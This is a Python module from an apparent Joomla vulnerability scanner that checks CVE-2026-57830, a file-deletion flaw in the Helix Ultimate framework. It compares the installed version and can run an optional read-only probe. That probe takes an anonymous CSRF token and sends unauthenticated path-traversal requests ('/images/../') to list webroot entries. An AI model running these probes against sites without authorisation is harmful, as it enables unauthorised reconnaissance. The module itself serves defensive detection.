from __future__ import annotations

import json
import secrets

from ...core.http import HttpClient, form_encode, normalize_url
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import find_anon_csrf_token
from ...core.versions import version_lte

CVE_ID = "CVE-2026-57830"
NAME = "Helix Ultimate unauthenticated arbitrary file deletion"
COMPONENT = "Helix Ultimate Framework"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "plg_system_helixultimate up to and including 2.2.6"
FIXED_RULE = "Update Helix Ultimate to 2.2.7 or newer"
AJAX_BASE = "/index.php?option=com_ajax&format=json&helix=ultimate&request=task"
AJAX_ENDPOINT = f"{AJAX_BASE}&action=view-media"


def _parse_listing(response: dict) -> dict | None:
    if response.get("status") != 200 or response.get("redirected"):
        return None
    try:
        parsed = json.loads(response.get("body", ""))
    except (json.JSONDecodeError, TypeError):
        return None
    if not isinstance(parsed, dict) or parsed.get("status") is not True:
        return None
    output = parsed.get("output")
    folders = parsed.get("folders")
    images = parsed.get("images")
    if not isinstance(output, str) or "helix-ultimate-media-manager" not in output:
        return None
    if not isinstance(folders, list) or not isinstance(images, list):
        return None
    return {
        "parsed": parsed,
        "folder_count": len(folders),
        "image_count": len(images),
        "entry_count": len(folders) + len(images),
        "path": parsed.get("path"),
        "signature": (parsed.get("path"), tuple(folders), tuple(images)),
        "absolute_paths_disclosed": any(
            isinstance(item, str) and (item.startswith("/") or ":\\" in item)
            for item in images
        ),
    }


def affected_helixultimate(version: str | None) -> bool:
    if version is None:
        return False
    return version_lte(version, "2.2.6")


def passive_result(plugins: dict | None) -> Finding:
    helix = (plugins or {}).get("helixultimate", {})
    found = bool(helix.get("found"))
    version = helix.get("version")
    source = helix.get("source") or "unknown"

    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Helix Ultimate was not detected via template/plugin routes.",
            action="Component not detected via standard public routes; verify manually if installed under a custom path.",
        )

    if not version:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="INCONCLUSIVE",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"Helix Ultimate was detected at {source}, but its version could not be determined.",
            action="Manually verify plg_system_helixultimate version and patch status.",
        )

    if affected_helixultimate(version):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"Helix Ultimate {version} is at or below 2.2.6.",
            action="Update Helix Ultimate to 2.2.7 or newer and restrict unauthenticated AJAX access.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="PATCHED",
        confidence="HIGH",
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=f"Helix Ultimate {version} is outside the affected <= 2.2.6 range.",
        action="Keep Helix Ultimate updated.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    token, token_source = find_anon_csrf_token(
        base,
        timeout=timeout,
        proxy=proxy,
        requester=client.request,
    )
    if not token:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/",
            detail=(
                "Could not extract an anonymous Joomla CSRF token from homepage, contact, "
                "users form pages, or administrator login."
            ),
            action="Manually verify Helix Ultimate version and endpoint exposure.",
        )

    headers = {"Content-Type": "application/x-www-form-urlencoded", "X-CSRF-Token": token, "X-Requested-With": "XMLHttpRequest"}

    def request_action(action: str, path: str) -> tuple[dict, dict | None]:
        url = f"{base}{AJAX_BASE}&action={action}"
        response = client.request(
            url,
            method="POST",
            headers=headers,
            data=form_encode({"path": path, token: "1"}),
            timeout=timeout,
            follow_redirects=False,
        )
        return response, _parse_listing(response)

    control_action = f"proofcms-{secrets.token_hex(6)}"
    control_response, control_listing = request_action(control_action, "/images")
    images_response, images_listing = request_action("view-media", "/images")
    proof_url = f"{base}{AJAX_ENDPOINT}"
    evidence = {
        "component_present": False,
        "token_accepted": False,
        "handler_reached": False,
        "negative_control_rejected": control_listing is None,
        "media_listing_confirmed": False,
        "webroot_boundary_escape": False,
        "absolute_paths_disclosed": False,
    }
    if not images_listing or control_listing is not None:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            evidence=evidence,
            detail=(
                "The view-media response did not expose the Helix-specific listing signature, or the same signature "
                "was returned by a nonexistent-action control. "
                f"Probe HTTP {images_response.get('status', 0)}; control HTTP {control_response.get('status', 0)}; "
                f"probe redirected={images_response.get('redirected', False)}."
            ),
            action="If Helix Ultimate is installed and <= 2.2.6, manually verify server-side protection.",
        )

    evidence.update(
        {
            "component_present": True,
            "token_accepted": True,
            "handler_reached": True,
            "media_listing_confirmed": True,
            "media_folders": images_listing["folder_count"],
            "media_images": images_listing["image_count"],
            "absolute_paths_disclosed": images_listing["absolute_paths_disclosed"],
        }
    )
    _, root_listing = request_action("view-media", "/")
    _, traversal_listing = request_action("view-media", "/images/../")
    boundary_escape = bool(
        root_listing
        and traversal_listing
        and root_listing["signature"] == traversal_listing["signature"]
        and root_listing["signature"] != images_listing["signature"]
    )
    evidence["webroot_boundary_escape"] = boundary_escape
    if root_listing:
        evidence["webroot_entries"] = root_listing["entry_count"]
        evidence["absolute_paths_disclosed"] = bool(
            evidence["absolute_paths_disclosed"] or root_listing["absolute_paths_disclosed"]
        )
    traversal_detail = (
        f" POST path traversal escaped the intended images directory and listed {root_listing['entry_count']} "
        "webroot entries; it did not read file contents."
        if boundary_escape and root_listing
        else " The bounded path probes did not confirm escape from the images directory."
    )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="VULNERABLE",
        confidence="CONFIRMED",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=proof_url,
        evidence=evidence,
        detail=(
            "Safe read-only proof confirmed the Helix-specific media listing while a nonexistent-action control did "
            f"not. Folders listed: {images_listing['folder_count']}; images listed: "
            f"{images_listing['image_count']}. Token source: {token_source}."
            f"{traversal_detail} File deletion was not tested."
        ),
        action="Restrict unauthenticated AJAX media actions and update Helix Ultimate to 2.2.7 or newer.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    result = passive_result(plugins)
    if not run_exploit_check:
        return result
    if exploit_mode != "safe":
        result.detail += " This CVE module only supports the safe read-only view-media probe."
        return result
    probe = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    if result.status in {"NOT_AFFECTED", "NOT_DETECTED"} and probe.status != "VULNERABLE":
        result.detail += " Safe view-media probe was requested but did not confirm endpoint exposure."
        result.exploit_ran = probe.exploit_ran
        result.proof_url = probe.proof_url
        return result
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.4.0",
        "last_reviewed": "2026-09-29",
        "updated": "2026-09-29",
        "required_detectors": ["helixultimate"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-57830",
            "https://www.joomshaper.com/documentation/helix-framework/helix-ultimate",
        ],
    }
